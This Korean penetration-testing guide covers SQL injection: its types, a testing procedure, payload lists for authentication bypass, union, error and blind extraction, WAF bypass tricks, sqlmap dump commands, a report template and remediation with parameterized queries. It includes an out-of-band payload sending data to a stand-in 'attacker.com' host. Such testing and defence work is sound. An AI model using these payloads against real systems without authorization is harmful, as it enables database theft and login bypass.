---
sidebar_position: 11
title: SQL 인젝션 (SQL Injection)
description: 웹 진단 - SQL Injection 점검 절차, 페이로드, sqlmap 활용, 보고서 양식
keywords: [SQL Injection, SQLi, Error-based, Boolean, Time-based, Union-based, sqlmap, OWASP A05]
draft: false
---

# SQL 인젝션 (SQL Injection)

> 사용자 입력이 DB 쿼리에 안전하지 않게 삽입되어, 공격자가 **임의 SQL을 실행**할 수 있는 취약점.
> **DB 전체 덤프, 인증 우회, RCE(특정 DB)** 까지 이어지는 고위험 항목.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A05:2025 - Injection / KISA 입력값 검증 |
| **CWE** | [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| **영향도** | 🔴 매우 높음 (DB 전체 노출 / 인증 우회 / RCE 가능) |
| **점검 난이도** | 하 (오류 메시지 노출 시) / 최상 (Blind + WAF) |
| **예상 점검 시간** | 파라미터당 15분 ~ 4시간 (Blind는 시간 소요 큼) |

---

## 점검 목적

사용자 입력이 **SQL 쿼리에 그대로 연결(concatenation)** 되어, 공격자가 쿼리 구조를 변경할 수 있는지 확인한다. 성공 시 **인증 우회, DB 내 모든 테이블/컬럼 추출, 데이터 변조/삭제, 파일 시스템 접근, 일부 DB(MSSQL `xp_cmdshell` 등)에서는 OS 명령 실행**까지 가능.

---

## 유형 구분

| 유형 | 특징 | 페이로드 예 |
| :--- | :--- | :--- |
| **Error-based** | DB 에러 메시지가 응답에 노출 → 정보 추출 | `' AND extractvalue(1, concat(0x7e,(SELECT user())))-- -` |
| **Union-based** | UNION SELECT로 결과 직접 추출 | `' UNION SELECT 1,2,3-- -` |
| **Boolean-based Blind** | 응답 차이(True/False)로 비트 단위 추출 | `' AND 1=1-- -` vs `' AND 1=2-- -` |
| **Time-based Blind** | 응답 시간 차이로 추출 (응답 내용 동일할 때) | `' AND SLEEP(5)-- -` |
| **Out-of-Band (OOB)** | DNS / HTTP 요청으로 데이터 유출 | `'; SELECT load_file(CONCAT('\\\\',(SELECT user()),'.attacker.com\\test'))-- -` |
| **Second-Order** | 입력 시점이 아닌 다른 페이지에서 실행될 때 발현 | (회원가입 시 페이로드 저장 → 마이페이지에서 실행) |

---

## 진단 절차

### Step 1. 진입점 식별

- URL 파라미터 (`?id=1`, `?category=books`)
- POST 폼 (로그인, 검색, 필터, 정렬)
- HTTP 헤더 (`User-Agent`, `X-Forwarded-For` — 로깅 시스템에서 자주 발현)
- 쿠키 (`session_id`, `lang`)
- JSON / XML body 내부 값
- 정렬/페이징 파라미터 (`order=`, `sort=`, `limit=`) — 자주 놓치는 곳

### Step 2. 1차 탐지 — 오류 유발

가장 빠른 방법은 **특수문자 하나 넣어 오류 발생 여부 확인**:

```
'
"
\
`
)
'))
';
```

응답이 500 / 빈 페이지 / DB 오류 메시지로 바뀌면 → 인젝션 후보.

### Step 3. 인젝션 가능성 확인 (True/False 차이)

```
?id=1' AND 1=1-- -    # 정상 응답 (TRUE)
?id=1' AND 1=2-- -    # 빈 결과 또는 다른 응답 (FALSE)
```

응답 차이가 있으면 → Boolean-based 확정.

### Step 4. DB 종류 식별 (Fingerprinting)

| DB | 식별 페이로드 |
| :--- | :--- |
| MySQL/MariaDB | `' AND @@version-- -` 또는 `SLEEP(5)` |
| PostgreSQL | `' AND version()-- -` 또는 `pg_sleep(5)` |
| MSSQL | `' AND @@version-- -` 또는 `WAITFOR DELAY '0:0:5'-- -` |
| Oracle | `' AND (SELECT banner FROM v$version)-- -` |
| SQLite | `' AND sqlite_version()-- -` |

### Step 5. 데이터 추출 (Exploitation)

확인된 유형/DB에 따라 적절한 페이로드로 사용자/테이블/컬럼/데이터 추출.

### Step 6. 영향 입증 — sqlmap 보조 활용

수동 확인 후 sqlmap으로 자동화하여 추출 범위 확정.

---

## 페이로드 / 테스트 케이스

### 케이스 1: 인증 우회 (로그인 폼)

```sql
admin' -- -
admin' #
admin'/*
' OR '1'='1' -- -
' OR 1=1 -- -
admin' OR 1=1 LIMIT 1 -- -
```

**판정:** 비밀번호 없이 또는 임의 비밀번호로 로그인 성공.

### 케이스 2: Error-based 추출 (MySQL)

```sql
' AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
' AND extractvalue(1, concat(0x7e, (SELECT user())))-- -
' AND extractvalue(1, concat(0x7e, (SELECT database())))-- -
' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

**판정:** 오류 메시지에 DB 버전/사용자/데이터가 노출됨.

### 케이스 3: Union-based 추출

```sql
# 1) 컬럼 수 확인 (ORDER BY 점진 증가)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    # 오류나는 직전이 컬럼 수

# 2) 출력 위치 확인
' UNION SELECT 1,2,3-- -

# 3) 데이터 추출
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1, concat(username,':',password), 3 FROM users-- -
```

### 케이스 4: Boolean-based Blind

```sql
# 비교 1글자씩
' AND SUBSTRING((SELECT database()),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -

# 이진 탐색으로 빠르게 추출
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -
```

### 케이스 5: Time-based Blind

```sql
# MySQL
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
' AND IF((SELECT user())='root@localhost', SLEEP(5), 0)-- -

# PostgreSQL
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

# MSSQL
'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'-- -
```

### 케이스 6: WAF 우회 기법

```sql
# 공백 우회
'/**/OR/**/1=1-- -
'%09OR%091=1-- -                  # Tab
'%0aOR%0a1=1-- -                  # Newline

# 키워드 우회
'/*!50000UNION*//*!50000SELECT*/...
' UNion SeLect ...                # 대소문자 혼합

# 따옴표 차단 시
1 AND 1=(SELECT 1 FROM users WHERE id=1)
1 AND (SELECT username FROM users LIMIT 1)=0x61646d696e   # hex 인코딩
```

### 케이스 7: sqlmap 자동화

```bash
# 기본 - GET 파라미터
sqlmap -u "https://<TARGET>/page?id=1" --batch

# POST 파라미터
sqlmap -u "https://<TARGET>/login" --data="username=test&password=test" --batch

# 쿠키 + 인증 세션
sqlmap -u "https://<TARGET>/profile?id=1" \
  --cookie="SESSION=abcd1234" \
  --batch

# Burp 요청 파일 그대로 사용
sqlmap -r request.txt --batch

# DB / 테이블 / 데이터 추출
sqlmap -u "..." --dbs
sqlmap -u "..." -D <DB명> --tables
sqlmap -u "..." -D <DB명> -T <테이블명> --columns
sqlmap -u "..." -D <DB명> -T <테이블명> -C "username,password" --dump

# WAF 우회 (tamper 스크립트)
sqlmap -u "..." --tamper=space2comment,between,randomcase --batch
sqlmap -u "..." --level=5 --risk=3 --batch    # 더 공격적
```

> ⚠️ **실무 주의**: 운영 환경에서 sqlmap `--risk=3` 또는 `--dump` 무제한 실행은 DB 부하/데이터 변조 위험. 사전 협의 + `--threads` 낮추기 + `--dump-format=CSV --first=1 --last=10` 등으로 범위 제한.

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 입력값에 SQL 구문을 넣었을 때 **DB 오류 메시지**가 응답에 노출됨
- [ ] `' AND 1=1` 과 `' AND 1=2` 의 응답이 **명확히 다름** (Boolean-based)
- [ ] `SLEEP(N)` / `pg_sleep(N)` / `WAITFOR DELAY` 페이로드에서 **응답 지연이 페이로드와 비례** (Time-based)
- [ ] UNION SELECT로 **임의 데이터를 응답에 출력** 가능
- [ ] sqlmap이 인젝션을 확인하고 DB명/테이블명 추출 성공

**오탐 주의 (다음은 SQLi 아님):**

- [ ] 단순 500 오류 (DB 오류가 아니라 어플리케이션 오류일 수 있음 — 메시지 내용 확인)
- [ ] 응답 차이가 페이로드와 무관 (캐싱, A/B 테스트 등)
- [ ] 입력값이 클라이언트 측에서만 처리되고 서버로 안 가는 경우

---

## PoC 양식 (보고서 붙여넣기용)

**[SQL Injection - Error-based] - 상품 상세 페이지 `id` 파라미터**

1. `<TARGET>/product?id=1` 정상 접근 확인
2. `id` 파라미터에 아래 페이로드 삽입
3. 응답에서 DB 정보 노출 확인

**요청 (Request):**

```http
GET /product?id=1'%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))--%20- HTTP/1.1
Host: <TARGET>
Cookie: SESSION=abcd1234
```

**응답 (Response) — 취약 발현 증거:**

```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8

<html>
  ...
  <pre>
  java.sql.SQLException: XPATH syntax error: '~10.4.32-MariaDB'
  </pre>
  ...
</html>
```

**확인 사항:**
- 응답에 DB 버전 정보(`10.4.32-MariaDB`)가 그대로 노출됨
- 동일 패턴으로 `user()`, `database()`, `information_schema` 조회 가능
- sqlmap으로 추가 검증 시 `users` 테이블 전체 덤프 가능 (별첨 로그 참조)

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🔴 **매우 높음** — DB 내 모든 테이블/컬럼 노출 가능. 개인정보, 자격증명, 결제정보 등 전수 유출.
- **무결성 (Integrity)**: 🔴 **매우 높음** — `UPDATE` / `INSERT` / `DELETE` 가능 시 데이터 변조/삭제.
- **가용성 (Availability)**: 🟡 `DROP TABLE` 또는 무거운 쿼리로 DoS 가능.
- **추가 위협**:
  - MSSQL `xp_cmdshell` 활성화 시 → **OS 명령 실행 (RCE)**
  - MySQL `INTO OUTFILE` 권한 시 → **웹쉘 업로드**
  - PostgreSQL `COPY ... FROM PROGRAM` → **RCE**

**비즈니스 임팩트:**
회원 DB 전체 유출 시 개인정보보호법 위반으로 과징금 및 신뢰도 손상. 결제 시스템 연동 DB 침해 시 직접 금전 손실. 실무 진단에서 **단일 SQLi 1건도 Critical 등급**으로 분류되는 것이 일반적.

---

## 대응방안

### 개발자 관점 (필수)

1. **Prepared Statement / Parameterized Query 사용** — 가장 확실한 방어:

   ```java
   // Java JDBC
   PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
   ps.setInt(1, userId);
   ResultSet rs = ps.executeQuery();
   ```

   ```python
   # Python (psycopg2 / PyMySQL)
   cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
   ```

   ```javascript
   // Node.js (mysql2)
   conn.execute('SELECT * FROM users WHERE id = ?', [userId]);
   ```

2. **ORM 사용 시에도 raw query는 파라미터 바인딩** — Hibernate `HQL`, Django ORM, Sequelize 등에서도 문자열 concat 금지.

3. **저장 프로시저도 동적 SQL이면 동일하게 취약** — `EXEC` / `sp_executesql` 사용 시 파라미터 바인딩 적용.

4. **입력값 화이트리스트 검증** — 정렬/페이징 등 컬럼명이 동적인 경우, **허용 목록**에서만 선택:

   ```python
   ALLOWED_SORT = {'name', 'date', 'price'}
   sort_col = request.args.get('sort')
   if sort_col not in ALLOWED_SORT:
       sort_col = 'name'  # default
   ```

### 운영자 관점

1. **DB 계정 최소 권한 원칙** — 웹 앱용 DB 계정에 `DROP`, `FILE`, `SUPER` 권한 부여 금지. `xp_cmdshell` 비활성.

2. **WAF 룰 적용** — ModSecurity OWASP CRS 등 (보조 수단, 단독 의존 금지).

3. **에러 메시지 노출 차단** — 운영 환경에서 DB 오류 메시지가 사용자에게 직접 노출되지 않도록 `display_errors=Off`, 일반화된 오류 페이지 처리.

4. **DB 접근 로깅 및 이상 탐지** — 비정상적인 UNION, information_schema 조회 패턴 모니터링.

### 안전 / 위험 코드 비교

```python
# 위험 — 문자열 concat
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# 위험 — % 포맷팅
query = "SELECT * FROM users WHERE id = '%s'" % user_id
cursor.execute(query)

# 안전 — 파라미터 바인딩
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

---

## 참고자료

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger - SQL injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap 공식 문서](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
